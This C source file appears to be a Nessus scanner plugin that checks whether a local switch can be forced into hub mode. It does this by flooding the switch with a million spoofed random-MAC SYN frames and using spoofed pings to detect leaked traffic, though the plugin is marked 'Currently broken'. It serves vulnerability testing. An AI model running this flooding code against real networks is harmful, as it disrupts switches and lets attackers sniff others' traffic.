/*
 * This script is (C) Renaud Deraison
 * It is released under the GPLv2
 */
#include <includes.h>
#undef FIX
#undef UNFIX
#include <pcap.h>
#include <libnet.h>


#define EN_NAME "3Com hub"

#define EN_FAMILY "Misc."

#define EN_DESC "\
The remote host on the local network seems to be connected\n\
through a switch which can be turned into a hub when flooded\n\
by different mac addresses.\n\n\
The theory is to send a lot of packets (> 1000000) to the\n\
port of the switch we are connected to, with random mac\n\
addresses. This turns the switch into learning mode, where\n\
traffic goes everywhere.\n\
An attacker may use this flaw in the remote switch\n\
to sniff data going to this host\n\n\
Solution : Lock Mac addresses on each port of the remote switch\n\
Risk factor : High\n\
See also : http://www.securitybugware.org/Other/2041.html"

#define EN_COPY "Written by Renaud Deraison <deraison@cvs.nessus.org>"

#define EN_SUMM "Turns the remote switch into a hub"

int plugin_init(desc)
 struct arglist * desc;
{ 
 return -1; /* Currently broken */
 plug_set_id(desc, 11025);
 plug_set_version(desc, "$Revision: 1360 $");
 plug_set_name(desc, EN_NAME, NULL);
 plug_set_category(desc, ACT_DENIAL);
 plug_set_family(desc, EN_FAMILY, NULL);
 plug_set_description(desc, EN_DESC, NULL);
 plug_set_summary(desc, EN_SUMM,NULL);
 plug_set_copyright(desc, EN_COPY, NULL);;
 plug_set_timeout(desc, PLUGIN_TIMEOUT*4);
 return(0);
}

int 
flood(device)
  char * device;
{
  u_char enet_src[6], enet_dst[6];
  char err_buf[LIBNET_ERRBUF_SIZE];
  int i, j, write_result;
  struct in_addr src, dst, mask, rnd;
#ifndef HAVE_LIBNET_1_1
  struct libnet_link_int * network;
  int packet_size;
  u_char * packet;
#else /* HAVE_LIBNET_1_1 */
  libnet_t *network;
  libnet_ptag_t ether_tag = LIBNET_PTAG_INITIALIZER,
                ip_tag = LIBNET_PTAG_INITIALIZER,
                tcp_tag = LIBNET_PTAG_INITIALIZER;
#endif /* HAVE_LIBNET_1_1 */

#ifndef HAVE_LIBNET_1_1
  network = libnet_open_link_interface(device, err_buf);
#else /* HAVE_LIBNET_1_1 */
  network = libnet_init(LIBNET_LINK, device, err_buf);
#endif /* HAVE_LIBNET_1_1 */
  if(network == NULL)
  {
#ifndef HAVE_LIBNET_1_1
    libnet_error(LIBNET_ERR_FATAL, "libnet_open_link_interface: %s\n",
		err_buf);
#else /* HAVE_LIBNET_1_1 */
    fprintf(stderr, "libnet_init() failed: %s\n", err_buf);
#endif /* HAVE_LIBNET_1_1 */
    return -1;
  }

#ifndef HAVE_LIBNET_1_1
  packet_size = LIBNET_IP_H + LIBNET_ETH_H + LIBNET_TCP_H;
#endif /* HAVE_LIBNET_1_1 */

  for(i=0;i<1000000;i=i+1)
  {

    inet_aton("10.0.0.0", &src);
    inet_aton("10.0.0.0", &dst);
    inet_aton("255.0.0.0", &mask);

    rnd.s_addr = (rand()) & (~mask.s_addr);
    src.s_addr = src.s_addr | rnd.s_addr;
    
    rnd.s_addr = rand() & (~mask.s_addr);
    dst.s_addr = dst.s_addr | rnd.s_addr;

  for(j=0;j<6;j=j+1)
  {
    enet_src[j] = rand() % 255;
    enet_dst[j] = rand() % 255;
  }

#ifndef HAVE_LIBNET_1_1
  libnet_init_packet(packet_size, &packet);
#else /* HAVE_LIBNET_1_1 */
    tcp_tag = libnet_build_tcp(rand() % 65535,
		rand() % 65535,
		rand(),
		rand(),
		TH_SYN,
		1024,
		0,
		0,
		LIBNET_TCP_H,
		NULL,
		0,
		network,
		tcp_tag);
    if (tcp_tag == -1)
    {
      fprintf(stderr, "libnet_build_tcp() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }

    ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H,
		0,
		rand(),
		0,
		64,
		IPPROTO_TCP,
		0,
		src.s_addr,
		dst.s_addr,
		NULL,
		0,
		network,
		ip_tag);
    if (ip_tag == -1)
    {
      fprintf(stderr, "libnet_build_ipv4() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }

    ether_tag = libnet_build_ethernet(enet_dst,
		enet_src,
		ETHERTYPE_IP,
		NULL,
		0,
		network,
		ether_tag);
    if (ether_tag == -1)
    {
      fprintf(stderr, "libnet_build_ethernet() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }
#endif /* HAVE_LIBNET_1_1 */

#ifndef HAVE_LIBNET_1_1
  libnet_build_ethernet(enet_dst, enet_src, ETHERTYPE_IP, NULL, 0, packet);
  libnet_build_ip(TCP_H, 0, rand(), 0, 64, IPPROTO_TCP, src.s_addr, dst.s_addr, NULL, 0, packet + LIBNET_ETH_H);
  libnet_build_tcp(rand() % 65535, rand() % 65535, rand(), rand(), TH_SYN, 1024, 0, NULL, 0, packet + LIBNET_ETH_H + LIBNET_IP_H);
#else /* HAVE_LIBNET_1_1 */
    write_result = libnet_write(network);
    if (write_result == -1)
    {
      fprintf(stderr, "libnet_write() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }
#endif /* HAVE_LIBNET_1_1 */

#ifndef HAVE_LIBNET_1_1
  libnet_do_checksum(packet+ETH_H, IPPROTO_TCP, LIBNET_TCP_H);
  libnet_write_link_layer(network, device, packet, packet_size);
  libnet_destroy_packet(&packet);
#endif /* ! HAVE_LIBNET_1_1 */
  }
#ifndef HAVE_LIBNET_1_1
  libnet_close_link_interface(network);
#endif /* ! HAVE_LIBNET_1_1 */

#ifdef HAVE_LIBNET_1_1
  libnet_destroy(network);
#endif /* HAVE_LIBNET_1_1 */
  return 0;
}

int
ping(dev, src, dst)
  char * dev;
  struct in_addr src, dst;
{
  int bpf, i, len, ret, write_result;
  char filter[1024];
  char *asc_src;
#ifndef HAVE_LIBNET_1_1
  int packet_size = LIBNET_IP_H + LIBNET_ICMP_ECHO_H, rsoc;
  struct libnet_arena * arena_p, arena;
  u_char *packets[5];
  arena_p = &arena;
#else /* HAVE_LIBNET_1_1 */
  libnet_t *network;
  libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER,
                icmp_tag = LIBNET_PTAG_INITIALIZER;
  char err_buf[LIBNET_ERRBUF_SIZE];
#endif /* HAVE_LIBNET_1_1 */

  asc_src = estrdup(inet_ntoa(src));
  snprintf(filter, sizeof(filter), "icmp and src host %s and dst host %s",
      		inet_ntoa(dst),
		asc_src);
  efree(&asc_src);
  bpf = bpf_open_live(dev, filter);
  if(bpf < 0)
   return -1;

#ifndef HAVE_LIBNET_1_1
  libnet_init_packet_arena(&arena_p, 5, packet_size);
  rsoc = libnet_open_raw_sock(IPPROTO_RAW);
  if(rsoc < 0)
#else /* HAVE_LIBNET_1_1 */
  network = libnet_init(LIBNET_RAW4, dev, err_buf);
  if(network == NULL)
#endif /* HAVE_LIBNET_1_1 */
  {
#ifndef HAVE_LIBNET_1_1
    libnet_error(LIBNET_ERR_FATAL, "Can't open the network\n");
#else /* HAVE_LIBNET_1_1 */
    fprintf(stderr, "libnet_init() failed: %s\n", err_buf);
#endif /* HAVE_LIBNET_1_1 */
    return -1;
  }

  for(i=0 ; i < 5 ; i++)
  {
#ifndef HAVE_LIBNET_1_1
    packets[i] = libnet_next_packet_from_arena(&arena_p, packet_size);
    libnet_build_ip(ICMP_ECHO_H,
#else /* HAVE_LIBNET_1_1 */
    icmp_tag = libnet_build_icmpv4_echo(ICMP_ECHO,
		0,
		0,
		rand(),
		5,
		NULL,
		0,
		network,
		icmp_tag);
    if (icmp_tag == -1)
    {
      fprintf(stderr, "libnet_build_icmpv4_echo() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }

    ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H,
#endif /* HAVE_LIBNET_1_1 */
		IPTOS_LOWDELAY | IPTOS_THROUGHPUT,
		rand(),
		0,
		48,
		IPPROTO_ICMP,
#ifdef HAVE_LIBNET_1_1
		0,
#endif /* HAVE_LIBNET_1_1 */
		src.s_addr,
		dst.s_addr,
		NULL,
		0,
#ifndef HAVE_LIBNET_1_1
		packets[i]);
#else /* HAVE_LIBNET_1_1 */
		network,
		ip_tag);
    if (ip_tag == -1)
    {
      fprintf(stderr, "libnet_build_ipv4() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }
#endif /* HAVE_LIBNET_1_1 */

#ifndef HAVE_LIBNET_1_1
    libnet_build_icmp_echo(ICMP_ECHO,
		0,
		rand(),
		5,
		NULL,
		0,
		packets[i]+ LIBNET_IP_H);
#else /* HAVE_LIBNET_1_1 */
    write_result = libnet_write(network);
    if (write_result == -1)
    {
      fprintf(stderr, "libnet_write() failed: %s\n", libnet_geterror(network));
      libnet_destroy(network);
      return -1;
    }
#endif /* HAVE_LIBNET_1_1 */

#ifndef HAVE_LIBNET_1_1
    libnet_do_checksum(packets[i], IPPROTO_ICMP, LIBNET_ICMP_ECHO_H);
    libnet_write_ip(rsoc, packets[i], packet_size);
#endif /* ! HAVE_LIBNET_1_1 */
  }

  if(bpf_next(bpf, &len))ret = 1;
  else ret = 0;
#ifndef HAVE_LIBNET_1_1
  libnet_destroy_packet_arena(&arena_p);
  libnet_close_raw_sock(rsoc);
#else /* HAVE_LIBNET_1_1 */
  libnet_destroy(network);
#endif /* HAVE_LIBNET_1_1 */
  bpf_close(bpf);
  return ret;
}

struct in_addr find_fake(dev, dst, me, network, mask)
  char * dev;
  struct in_addr dst, me;
  bpf_u_int32 network, mask;
{
  bpf_u_int32 start, end, i;
  struct in_addr ip;
  int ret;

  start = network & mask;
  end = (network & mask) | (~mask);
  i = start;
  for(;;)
  {
    if(ntohl(i) >= ntohl(end))
    {
      ip.s_addr = 0;
      return ip;
    }

    i = htonl(ntohl(i) + 1);
    ip.s_addr = i;
    if((ip.s_addr == dst.s_addr) || (ip.s_addr == me.s_addr))
      continue;
    ret = ping(dev, me, ip);
    if (ret == -1) 
    {
      ip.s_addr = 0;
      return ip;
    }
    else if (ret > 0)
      return ip;
  }
}

int
plugin_run(desc)
 struct arglist * desc;
{
  struct in_addr target;
  struct in_addr myip;
  struct in_addr fakeip, broadcast, netaddr;
  struct in_addr * ptr;
  char * dev;
  bpf_u_int32 net, mask;
  char errbuf[PCAP_ERRBUF_SIZE];
  int ret;

  return(0); /* Currently broken */
  
  ptr = plug_get_host_ip(desc);
  if(islocalhost(ptr))
    return 0;
  target.s_addr = ptr->s_addr;
  dev = routethrough(&target, &myip);
  pcap_lookupnet(dev, &net, &mask, errbuf);
  if((net & mask) != (target.s_addr & mask))
    return 0;	/* not a local host */

  netaddr.s_addr = net & mask;
  broadcast.s_addr = (net & mask) | (~mask);
 
  fakeip = find_fake(dev, target, myip, net, mask);
  if(!fakeip.s_addr)
    return 0; /* we are alone on this network */

  ret = ping(dev, fakeip, target);
  if (ret == -1) return -1;
  else if (ret == 0)
  {
    /*
     * Good thing - the remote host did not reply to our ping. We can
     * go on
     */
    ret = flood(dev);
    if (ret == -1) return -1;
    ret = ping(dev, fakeip, target);
    if (ret == -1) return -1;
    else if (ret)
    {
       /* The remote host replied. Not good. We won */
       post_hole(desc, 0, NULL);
    }
  }
  return 0;
}
